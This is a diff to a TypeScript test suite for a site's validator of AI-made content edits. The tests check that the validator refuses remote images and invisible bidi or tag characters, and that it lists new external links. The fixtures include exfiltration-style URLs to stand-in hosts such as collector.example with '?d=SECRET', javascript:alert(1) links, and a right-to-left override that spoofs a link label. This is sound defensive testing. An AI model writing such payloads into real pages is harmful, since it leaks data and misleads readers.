@@ -7,12 +7,17 @@
  *     Markdown inline and by reference, `<img>`, `<Figure>`, any JSX `src`,
  *     `srcset`/`srcSet` or `poster`, an expression attribute, a cover — and
  *     every spelling a browser reads as another host (`//`, `/\`, upper
- *     case, `data:`); one already in the stored text may stay;
- *   - invisible control characters a write adds are refused; zero-width
- *     characters outside joiner contexts are counted, emoji and Persian
- *     joiners are not;
- *   - new external links are kept and listed with their flags; links the
- *     text already had, site paths and inert iframes are not;
+ *     case, `data:`, a bare domain the Markdown twin prints as https); one
+ *     already in the stored text may stay;
+ *   - invisible control characters a write adds are refused, and so are the
+ *     owner's own once the write moves them or rewrites their line;
+ *     zero-width characters outside joiner contexts are counted, emoji and
+ *     Persian joiners are not;
+ *   - new external links are kept and listed with their flags, each as the
+ *     site prints it (a bare domain is an https link, inline, by reference
+ *     or in a case study's fields): every external href of the compiled page
+ *     is listed or was already there; links the text already had, site
+ *     paths, targets printed as plain text and inert iframes are not;
  *   - no AI write makes an outbound request: the main thread's fetch and
  *     http(s) are never called, and a local collector hears nothing.
  */
@@ -73,6 +78,10 @@ const REMOTE_FORMS = [
   '<img srcSet="https://img.example/srcset.png 2x" />',
   '<img src={"https://img.example/expression.png"} />',
   '<audio src="//img.example/sound.mp3"></audio>',
+  // Bare domains: the page drops them, but the Markdown twin and /llms-full.txt print them as https images.
+  '![a](collector.example/x.png?d=SECRET)',
+  '![a](relative.png)',
+  '<Figure src="collector.example/figure.png" alt="x" />',
 ]
 
 test('a new remote image is refused in every form the renderer reads, and every spelling of another host', async () => {
@@ -84,9 +93,11 @@ test('a new remote image is refused in every form the renderer reads, and every 
       assert.match(out.message, /\/uploads\/<name>/)
     }
   }
-  const cover = await validate.validateAiWrite(subject('Text.', { fm: { cover: 'https://img.example/cover.png' }, touched: ['cover'] }))
-  assert.ok(!cover.ok && cover.code === 'REMOTE_IMAGE' && cover.data?.field === 'cover', JSON.stringify(cover))
-  for (const ok of ['![a](/uploads/field.webp)', '<Figure src="/uploads/field.webp" alt="a" />', '![a](/images/site.png)', '![a](relative.png)']) {
+  for (const remote of ['https://img.example/cover.png', 'collector.example/cover.png']) {
+    const cover = await validate.validateAiWrite(subject('Text.', { fm: { cover: remote }, touched: ['cover'] }))
+    assert.ok(!cover.ok && cover.code === 'REMOTE_IMAGE' && cover.data?.field === 'cover', JSON.stringify(cover))
+  }
+  for (const ok of ['![a](/uploads/field.webp)', '<Figure src="/uploads/field.webp" alt="a" />', '![a](/images/site.png)']) {
     const out = await validate.validateAiWrite(subject(ok, { fm: { cover: '/uploads/field.webp' } }))
     assert.equal(out.ok, true, `${ok}: ${JSON.stringify(out)}`)
   }
@@ -100,7 +111,7 @@ test('a remote image already in the stored text may stay; a second, new one may 
   assert.ok(!added.ok && added.code === 'REMOTE_IMAGE' && added.data?.url === 'https://kept.example/new.png', JSON.stringify(added))
 })
 
-test('invisible control characters a write adds are refused; the owner’s own may stay', async () => {
+test('invisible control characters a write adds are refused', async () => {
   for (const [ch, name] of [
     ['‮', 'U+202E'],
     ['‪', 'U+202A'],
@@ -110,16 +121,47 @@ test('invisible control characters a write adds are refused; the owner’s own m
     ['\u{E007F}', 'U+E007F'],
   ]) {
     const inBody = await validate.validateAiWrite(subject(`Hello ${ch}world`))
-    assert.ok(!inBody.ok && inBody.code === 'INVISIBLE_CHARS' && inBody.data?.char === name, `${name}: ${JSON.stringify(inBody)}`)
+    assert.ok(!inBody.ok && inBody.code === 'INVISIBLE_CHARS' && inBody.data?.char === name && inBody.data?.moved === false, `${name}: ${JSON.stringify(inBody)}`)
     const inTitle = await validate.validateAiWrite(subject('Hello', { fm: { title: `Title ${ch}` }, touched: ['title'] }))
     assert.equal(!inTitle.ok && inTitle.code, 'INVISIBLE_CHARS', name)
   }
-  const before = { frontmatter: { title: 'T', date: '2026-05-01' }, body: 'مرحبا ⁧عالم⁩' }
-  assert.equal((await validate.validateAiWrite(subject('مرحبا ⁧عالم⁩ edited', { before }))).ok, true, 'isolates the owner wrote stay')
-  const more = await validate.validateAiWrite(subject('مرحبا ⁧عالم⁩ ⁧again⁩', { before }))
-  assert.equal(!more.ok && more.code, 'INVISIBLE_CHARS', 'one more is refused')
   const texts = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A ‮flipped alt' }, before: { alt: '' } })
   assert.equal(!texts.ok && texts.code, 'INVISIBLE_CHARS')
+})
+
+test('the owner’s own invisible characters stay only exactly where they stand: never moved into new text, never with their line rewritten', async () => {
+  const fm = { title: 'T', date: '2026-05-01' }
+  const check = (after: string, beforeBody: string, opts: { fm?: Fm } = {}) => validate.validateAiWrite(subject(after, { fm: opts.fm, before: { frontmatter: fm, body: beforeBody } }))
+  const refusedAs = (out: Awaited<ReturnType<typeof check>>, char: string, moved: boolean, why: string) =>
+    assert.ok(!out.ok && out.code === 'INVISIBLE_CHARS' && out.data?.char === char && out.data?.moved === moved, `${why}: ${JSON.stringify(out)}`)
+
+  // An Arabic quote with the owner's bidi isolates, and an unrelated paragraph.
+  const quote = 'مرحبا ⁧عالم⁩'
+  const stored = `${quote}\n\nAnother paragraph.`
+  assert.equal((await check(`${quote}\n\nAnother paragraph, edited.`, stored)).ok, true, 'an edit on another line')
+  assert.equal((await check(`Another paragraph.\n\n${quote}`, stored)).ok, true, 'the line moved as a whole')
+  assert.equal((await check(`${quote}\r\n\r\nAnother paragraph.`, stored)).ok, true, 'line endings are only line endings')
+  refusedAs(await check(`${quote} ⁧again⁩\n\nAnother paragraph.`, stored), 'U+2067', false, 'one more is added')
+  refusedAs(await check(`${quote}\n\n${quote}`, stored), 'U+2067', false, 'the line copied')
+  refusedAs(await check(`مرحبا ⁧عالم⁩ edited\n\nAnother paragraph.`, stored), 'U+2067', true, 'the line it stands on rewritten')
+  refusedAs(await check(`مرحبا ⁧عالم جديد⁩\n\nAnother paragraph.`, stored), 'U+2067', true, 'the text it governs rewritten')
+
+  // Carried into a link label: "trop" displays as "port".
+  const report = 'Quote: ‮عربي‬ done. See [the report](https://example.com/report).'
+  refusedAs(await check('Quote: عربي done. See [‮trop‬](https://example.com/report).', report), 'U+202E', true, 'moved into a link label')
+  refusedAs(await check('Quote: عربي done. See [the report](https://example.com/report).', report, { fm: { title: '‮T‬' } }), 'U+202E', true, 'moved into the title')
+  assert.equal((await check(`${report}\n\nA new paragraph.`, report)).ok, true, 'kept where it stands')
+
+  // A flag the owner wrote (TAG characters) stays where it is; copying it to a new line is refused.
+  const flag = '\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}'
+  assert.equal((await check(`Made in ${flag} England.\n\nNew line.`, `Made in ${flag} England.`)).ok, true)
+  refusedAs(await check(`Made in England.\n\nNew ${flag}.`, `Made in ${flag} England.`), 'U+E0067', true, 'the flag moved')
+
+  // Media texts follow the same rule.
+  const moved = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A flipped alt', caption: '‮x‬' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
+  assert.ok(!moved.ok && moved.code === 'INVISIBLE_CHARS' && moved.data?.moved === true, JSON.stringify(moved))
+  const kept = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A ‮flipped‬ alt', caption: 'A new caption' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
+  assert.equal(kept.ok, true, JSON.stringify(kept))
 })
 
 test('zero-width characters outside joiner contexts are counted, emoji and Persian joiners are not', async () => {
@@ -185,6 +227,100 @@ test('new external links are kept and listed with their flags; known links, site
   if (work.ok) assert.deepEqual(work.newLinks.map((l) => l.url), ['https://project.example/', 'https://code.example/repo', 'https://demo.example/?x=1', 'https://source.example/'])
 })
 
+test('a bare-domain link is listed as the https link the site prints — inline, by reference, in a case study’s fields — with its flags', async () => {
+  const { compileMdx } = await import('../lib/mdx')
+  const { mdxToMarkdown } = await import('../lib/markdownTwin')
+  const { unified } = await import('unified')
+  const remarkParse = (await import('remark-parse')).default
+  const body = [
+    '[read more](evil.example/collect?d=SECRET123) and [kept, spelled differently](kept.example/page).',
+    '',
+    'By reference: [r], and an autolink www.auto.example/path here.',
+    '',
+    '[r]: www.evil.example/x?d=SECRET456',
+    '',
+    '[normal](https://listed.example/?q=1) and [mail](mailto:owner@example.test)',
+    '',
+    'Printed as text, no link: [js](javascript:alert(1)), [proto](//evil.example/p), [rel](relative/page), [site](/blog/x), [hash](#top).',
+  ].join('\n')
+  const before = { frontmatter: { title: 'T', date: '2026-05-01' }, body: '[kept](https://kept.example/page)' }
+  const out = await validate.validateAiWrite(subject(body, { before }))
+  assert.ok(out.ok, JSON.stringify(out))
+  if (!out.ok) return
+  assert.deepEqual(Object.fromEntries(out.newLinks.map((l) => [l.url, l.flags])), {
+    'https://evil.example/collect?d=SECRET123': ['query'],
+    'https://www.evil.example/x?d=SECRET456': ['query'],
+    'http://www.auto.example/path': ['not-https'],
+    'https://listed.example/?q=1': ['query'],
+    'mailto:owner@example.test': ['scheme'],
+  })
+
+  // Parity with the renderers: every off-site href the page and the Markdown twin print is listed, or was already there.
+  const listed = new Set([...out.newLinks.map((l) => l.url), lint.readAddress('https://kept.example/page').url])
+  const nothing = { resolveSize: () => null, srcSetFor: () => null, avifSrcSetFor: () => null, placeholderFor: () => null, posterFor: () => null }
+  const { tree } = await compileMdx(body, nothing)
+  const printed: string[] = []
+  const walk = (n: any) => {
+    if (typeof n?.properties?.href === 'string') printed.push(n.properties.href)
+    for (const c of n?.children ?? []) walk(c)
+  }
+  walk(tree)
+  const twin = mdxToMarkdown(body, { siteUrl: 'https://site.invalid', pageUrl: 'https://site.invalid/blog/x' } as never)
+  const visit = (n: any) => {
+    if ((n.type === 'link' || n.type === 'definition') && typeof n.url === 'string' && !n.url.startsWith('https://site.invalid')) printed.push(n.url)
+    for (const c of n.children ?? []) visit(c)
+  }
+  visit(unified().use(remarkParse).parse(twin))
+  const offSite = printed.filter((h) => lint.readAddress(h).kind !== 'site')
+  assert.ok(offSite.length >= 6, JSON.stringify(offSite))
+  for (const href of offSite) assert.ok(listed.has(lint.readAddress(href).url), `printed but not listed: ${href}`)
+
+  // A case study's fields: link and repo as the page prints them (safeHref), extra links and metric sources (safeCaseStudyUrl).
+  const work = await validate.validateAiWrite(
+    subject('Text.', {
+      collection: 'work',
+      fm: {
+        link: 'collector.example/p',
+        repo: 'code.example/r?token=abc',
+        links: [{ label: 'Demo', url: 'collector.example/demo?d=SECRET' }, { label: 'Dropped', url: 'javascript:alert(1)' }],
+        outcomes: [{ value: '1', label: 'x', sourceUrl: 'source.example/s#frag' }],
+      },
+      touched: ['link', 'repo', 'links', 'outcomes'],
+      before: { frontmatter: { title: 'T', date: '2026-05-01', link: 'https://collector.example/p' }, body: 'Text.' },
+    }),
+  )
+  assert.ok(work.ok, JSON.stringify(work))
+  if (work.ok) {
+    assert.deepEqual(Object.fromEntries(work.newLinks.map((l) => [l.url, l.flags])), {
+      'https://code.example/r?token=abc': ['query'],
+      'https://collector.example/demo?d=SECRET': ['query'],
+      'https://source.example/s#frag': ['fragment'],
+    })
+  }
+})
+
+test('through the tools, a bare-domain link reaches the change’s preview and the result as the https link the page shows', async () => {
+  const { previewOf } = await import('../lib/ai/changes')
+  const version = (await tools.data('get_content', { collection: 'blog', ref: 'linted' }, 'draft')).version
+  const edited = await tools.call(
+    'edit_content',
+    { collection: 'blog', slug: 'linted', edits: [{ find: 'The original text.', replace: 'The original text, [read more](collector.example/c?d=SECRET).' }], base_version: version },
+    'draft',
+  )
+  assert.equal(edited.ok, true, edited.text)
+  assert.equal(edited.json.new_links, 1)
+  assert.deepEqual(previewOf(edited.json.change_id)?.newLinks, [{ url: 'https://collector.example/c?d=SECRET', flags: ['query'] }])
+
+  const created = await tools.call(
+    'create_draft',
+    { collection: 'work', slug: 'bare-links', frontmatter: { title: 'Bare links', link: 'collector.example/p', links: [{ label: 'Demo', url: 'collector.example/demo?d=SECRET' }] }, body: 'Case.' },
+    'draft',
+  )
+  assert.equal(created.ok, true, created.text)
+  assert.equal(created.json.new_links, 2)
+  assert.deepEqual(previewOf(created.json.change_id)?.newLinks.map((l) => l.url), ['https://collector.example/p', 'https://collector.example/demo?d=SECRET'])
+})
+
 test('the address reader agrees with a browser on the hard cases', () => {
   for (const [raw, kind] of [
     ['/uploads/a.webp', 'site'],
@@ -203,6 +339,10 @@ test('the address reader agrees with a browser on the hard cases', () => {
   }
   assert.equal(lint.isRemoteSource('/uploads/x.webp'), false)
   assert.equal(lint.isRemoteSource('//cdn.example/x.webp'), true)
+  // Read as a page path, but the Markdown twin prints a bare domain as an https image.
+  assert.equal(lint.remoteSource('relative.png'), 'https://relative.png/')
+  assert.equal(lint.remoteSource('collector.example/x.png?d=1'), 'https://collector.example/x.png?d=1')
+  assert.equal(lint.remoteSource('images/photo.png'), null, 'a relative path is no host anywhere')
 })
 
 test('no AI write makes an outbound request: no fetch or http(s) call on the main thread, nothing at a local collector', async () => {
